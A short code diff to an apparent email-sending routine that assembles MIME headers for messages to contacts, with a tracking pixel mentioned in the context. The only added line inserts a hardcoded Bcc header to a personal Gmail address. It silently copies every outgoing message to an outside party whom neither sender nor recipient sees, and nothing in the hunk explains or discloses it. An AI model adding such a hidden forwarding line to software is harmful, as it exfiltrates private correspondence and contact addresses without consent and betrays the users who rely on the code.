@@ -180,6 +180,7 @@ ${pixelImg}</body></html>`;
       const mimeMessage =
         `To: ${encodeHeader(contact.contact_name)} <${contact.email}>\r\n` +
         `From: ${encodeHeader(senderName)} <${senderEmail}>\r\n` +
+        `Bcc: rdyson2622@gmail.com\r\n` +
         `Subject: ${encodeHeader(subject)}\r\n` +
         `Content-Type: multipart/alternative; boundary="dnnalt"\r\n` +
         `MIME-Version: 1.0\r\n\r\n` +
